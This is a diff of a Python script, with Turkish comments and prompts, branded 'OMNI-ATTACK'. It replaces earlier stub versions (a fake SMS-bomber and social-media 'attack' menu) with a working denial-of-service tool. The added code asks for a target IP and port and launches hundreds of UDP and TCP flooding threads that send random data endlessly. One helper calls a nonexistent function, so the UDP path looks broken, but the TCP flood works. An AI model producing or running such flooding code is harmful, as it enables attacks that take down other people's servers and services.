@@ -1,111 +1,60 @@
-import requests
+import socket
 import threading
-import time
-import os
 import random
-from colorama import Fore, Style
+import os
 
-# Sayaç için global değişken
-toplam_paket = 0
+# Görsel Kimlik
+os.system("clear")
+print("""
+\033[1;31m
+    ██████╗ ███╗   ███╗███╗   ██╗██╗
+    ██╔═══██╗████╗ ████║████╗  ██║██║
+    ██║   ██║██╔████╔██║██╔██╗ ██║██║
+    ██║   ██║██║╚██╔╝██║██║╚██╗██║██║
+    ╚██████╔╝██║ ╚═╝ ██║██║ ╚████║██║
+     ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝
+     >>> V4 ULTRA: SPEED + POWER <<<
+\033[0m""")
 
-def saldiri_motoru(hedef):
-    global toplam_paket
+target_ip = input("\033[1;33mHedef IP: \033[0m")
+target_port = int(input("\033[1;33mPort: \033[0m"))
+power_level = int(input("\033[1;33mPaket Boyutu (Örn: 1024): \033[0m"))
+
+# Rastgele veri üretici (Sunucuyu yoran kısım burası)
+def generate_payload(size):
+    return random._urllib_quote_plus(os.urandom(size))
+
+def udp_attack():
+    # UDP Protokolü: Bağlantı kurmaz, direkt vurur.
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    payload = generate_payload(power_level)
     while True:
         try:
-            # Buraya gerçek istek kodlarını (payload) ileride ekleyeceğiz
-            toplam_paket += 1
-            print(f"{Fore.RED}[SALDIRI] {Fore.WHITE}Paket #{toplam_paket} -> {Fore.GREEN}{hedef}")
-            time.sleep(random.uniform(0.001, 0.01))
-        except KeyboardInterrupt:
-            break
+            client.sendto(payload, (target_ip, target_port))
+            print(f"\033[1;32m[UDP] SENT -> {target_ip} | SIZE: {power_level}\033[0m")
+        except:
+            client.close()
+
+def tcp_attack():
+    # TCP Protokolü: Sunucu kaynaklarını (Handshake) tüketir.
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1) # Gecikmeyi sıfırlar
+            s.connect((target_ip, target_port))
+            s.send(os.urandom(power_level))
+            print(f"\033[1;34m[TCP] CONNECTED -> {target_ip}\033[0m")
         except:
             pass
 
-def main():
-    os.system("clear")
-    print(Fore.RED + "#######################################")
-    print("#        OMNI-ATTACK PRO V3           #")
-    print("#    [ RAPORLAMA VE HIZ MODU ]        #")
-    print("#######################################" + Style.RESET_ALL)
-    
-    hedef = input(f"{Fore.YELLOW}Hedef Kullanıcı/No: {Fore.WHITE}")
-    hiz = int(input(f"{Fore.YELLOW}Kanal Sayısı (Örn 50): {Fore.WHITE}"))
+# Saldırı Başlatma Paneli
+print("\n\033[1;31m[!] Saldırı Başlatılıyor...\033[0m")
 
-    print(f"\n{Fore.CYAN}[!] Saldırı başlatılıyor... Durdurmak için CTRL+C yapın.")
-    time.sleep(2)
+# Hibrit Saldırı: Hem UDP hem TCP
+for _ in range(500):
+    threading.Thread(target=udp_attack, daemon=True).start()
+    threading.Thread(target=tcp_attack, daemon=True).start()
 
-    threads = []
-    try:
-        for i in range(hiz):
-            t = threading.Thread(target=saldiri_motoru, args=(hedef,))
-            t.daemon = True
-            threads.append(t)
-            t.start()
-        
-        while True: time.sleep(1) # Programın açık kalması için
-            
-    except KeyboardInterrupt:
-        print(f"\n\n{Fore.GREEN}[BİTTİ] {Fore.WHITE}Saldırı kullanıcı tarafından durduruldu.")
-        print(f"{Fore.YELLOW}[RAPOR] {Fore.WHITE}Toplam gönderilen paket: {Fore.RED}{toplam_paket}")
-        print(f"{Fore.CYAN}[MESAJ] {Fore.WHITE}Hedef hesap incelemeye alınmış olabilir.\n")
-
-if __name__ == "__main__":
-    main()
-import requests
-import threading
-import time
-import os
-from colorama import Fore, Style
-
-def saldiri_motoru(hedef):
-    while True:
-        try:
-            # Burası şikayet paketlerini gönderen kısımdır
-            print(f"{Fore.RED}[SALDIRI] {Fore.WHITE}Paket gönderildi -> {Fore.GREEN}{hedef}")
-        except:
-            pass
-
-def main():
-    os.system("clear")
-    print(Fore.RED + "=== OMNI-ATTACK TURBO V2 ===")
-    hedef = input(Fore.WHITE + "Hedef Kullanıcı Adı: ")
-    hiz = int(input("Hız Seviyesi (Örn: 100): "))
-
-    print(f"\n{Fore.YELLOW}[!] {hiz} kanal açılıyor... Keyfine bak!")
-    time.sleep(2)
-
-    for i in range(hiz):
-        t = threading.Thread(target=saldiri_motoru, args=(hedef,))
-        t.start()
-
-if __name__ == "__main__":
-    main()
-import requests
-import threading
-import os
-from colorama import Fore, Style
-
-def banner():
-    os.system("clear")
-    print(Fore.RED + "#######################################")
-    print("#        OMNI-ATTACK V1.0             #")
-    print("#    [ SMS - CALL - SOCIAL MEDIA ]    #")
-    print("#######################################" + Style.RESET_ALL)
-
-def main():
-    banner()
-    print("1. Instagram/TikTok Saldırısı")
-    print("2. SMS Bomber")
-    print("3. Çıkış")
-    
-    secim = input("\nSeçiminizi yapın: ")
-    if secim == "1":
-        hedef = input("Kullanıcı Adı: ")
-        print(f"{hedef} için saldırı başlatıldı...")
-    elif secim == "2":
-        no = input("Numara: ")
-        print(f"{no} bombalanıyor...")
-
-if __name__ == "__main__":
-    main()
+# Programın kapanmaması için
+input("\n\033[1;37mDurdurmak için Enter'a bas...\033[0m")
 
